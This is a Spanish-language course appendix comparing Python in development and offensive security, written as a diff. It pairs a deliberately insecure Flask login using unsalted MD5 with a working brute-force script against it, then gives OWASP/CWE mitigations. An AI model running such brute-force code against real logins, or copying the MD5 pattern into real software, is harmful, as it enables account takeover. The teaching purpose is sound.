@@ -1,0 +1,113 @@
+---
+title: "Apéndice E: Python - Del Desarrollo a la Seguridad Ofensiva"
+subtitle: "Comprende cómo Python sirve de puente entre el desarrollo de software y la seguridad"
+---
+
+> **Objetivo**: Comprender cómo Python sirve de puente entre el desarrollo de software y la seguridad ofensiva. Al finalizar, el estudiante podrá identificar las diferencias de paradigma, las librerías clave en cada rama, y reconocer vulnerabilidades comunes en código de producción.
+
+---
+
+## 1. Diferenciación de Paradigmas
+
+| Dimensión | Desarrollo de Aplicaciones | Seguridad Ofensiva |
+|-----------|---------------------------|-------------------|
+| **Propósito** | Construir sistemas funcionales y mantenibles (SDLC) | Encontrar fallos y explotar vulnerabilidades conocidas (CVE) |
+| **Prioridad** | Legibilidad (PEP8), escalabilidad, mantenibilidad | Eficacia, sigilo, velocidad de explotación |
+| **Manejo de errores** | Try/except, logging, graceful degradation | Fail-fast, silencio (no alertar al IDS/SIEM) |
+| **Testing** | Unit tests (pytest), integración, CI/CD | Pruebas en entorno controlado (lab), reproducción de CVE |
+| **Documentación** | Docstrings, README, Swagger/OpenAPI | Reporte de hallazgos, PoC, pasos de reproducción |
+
+---
+
+## 2. Librerías Clave Comparadas
+
+| Categoría | Desarrollo | Seguridad Ofensiva |
+|-----------|------------|-------------------|
+| **HTTP/API** | requests, httpx, aiohttp | requests (manipulación), urllib3, httpx (raw payloads) |
+| **Redes** | socket (básico), http.server | scapy, socket (raw), pwntools |
+| **Criptografía** | hashlib, secrets, cryptography | hashlib (cracking), pycryptodome, passlib |
+| **Web Frameworks** | FastAPI, Flask, Django | Flask (C2 servers), http.server (reverse shells) |
+| **Automatización** | subprocess, shutil, pathlib | subprocess (recon), os, ctypes (syscall) |
+| **Testing/Exploit** | pytest, unittest, coverage | pwntools, impacket, sqlmap API |
+
+---
+
+## 3. Caso Práctico: Sistema de Login vs Fuerza Bruta
+
+Un desarrollador construye un sistema de autenticación. Un ethical hacker lo audita con un ataque de fuerza bruta.
+
+### Lado Desarrollo: Sistema de Login (Flask)
+
+```python
+from flask import Flask, request, jsonify
+import hashlib
+
+app = Flask(__name__)
+USERS = {"admin": "5f4dcc3b5aa765d61d8327deb882cf99"}
+
+@app.route("/login", methods=["POST"])
+def login():
+    data = request.get_json()
+    user = data.get("username")
+    pwd_hash = hashlib.md5(data.get("password").encode()).hexdigest()
+    
+    if user in USERS and USERS[user] == pwd_hash:
+        return jsonify({"status": "ok"}), 200
+    return jsonify({"status": "denied"}), 401
+```
+
+### Lado Seguridad: Auditoría de Fuerza Bruta
+
+```python
+import requests
+import hashlib
+from itertools import islice
+
+TARGET = "http://192.168.1.105:5000/login"
+WORDLIST = "/usr/share/wordlists/rockyou.txt"
+
+# Propósito educativo: demostrar por qué MD5 es inseguro
+def brute_force(wordlist_path):
+    with open(wordlist_path) as f:
+        for line in islice(f, 1000):  # Limitado para demo
+            pwd = line.strip()
+            h = hashlib.md5(pwd.encode()).hexdigest()
+            r = requests.post(TARGET, json={
+                "username": "admin",
+                "password": pwd
+            })
+            if r.status_code == 200:
+                print(f"[+] Password found: {pwd}")
+                return pwd
+    print("[-] Not found in sample")
+
+brute_force(WORDLIST)
+```
+
+---
+
+## 4. Análisis de Riesgos (OWASP Top 10)
+
+| Vulnerabilidad | CWE | Problema en el código | Mitigación |
+|---------------|-----|----------------------|------------|
+| Hash inseguro (MD5) | CWE-327 | MD5 es rápido de crackear (~10B hashes/s en GPU) | Usar bcrypt o argon2 con salt |
+| Sin rate limiting | CWE-307 | No hay límite de intentos por IP o usuario | Flask-Limiter: 5 intentos/minuto |
+| Mensaje genérico | CWE-203 | "denied" confirma que la ruta existe | Mensaje idéntico para usuario o contraseña incorrecta |
+| Sin CSRF token | CWE-352 | Endpoint POST sin verificación de origen | Flask-WTF CSRF Protect |
+
+---
+
+## 5. Rúbrica de Evaluación
+
+| Criterio | Puntuación |
+|----------|------------|
+| **Diferenciación**: Explicar 3 diferencias entre código de desarrollo y script de seguridad | 25% |
+| **Librerías**: Identificar 3 librerías de cada rama y su propósito | 25% |
+| **Análisis de riesgos**: Identificar al menos 2 vulnerabilidades OWASP en código dado | 25% |
+| **Mitigación**: Proponer solución concreta para cada vulnerabilidad encontrada | 25% |
+
+> ⚠️ **Aviso**: Todo el código de seguridad en este módulo es estrictamente pedagógico. Su uso está limitado a entornos de laboratorio autorizados (CTF, VMs de práctica, auditorías con consentimiento).
+
+---
+
+**Volver al índice:** [Inicio](../index.qmd) | **Anterior:** [Apéndice D](05-git-github-con-python.qmd)
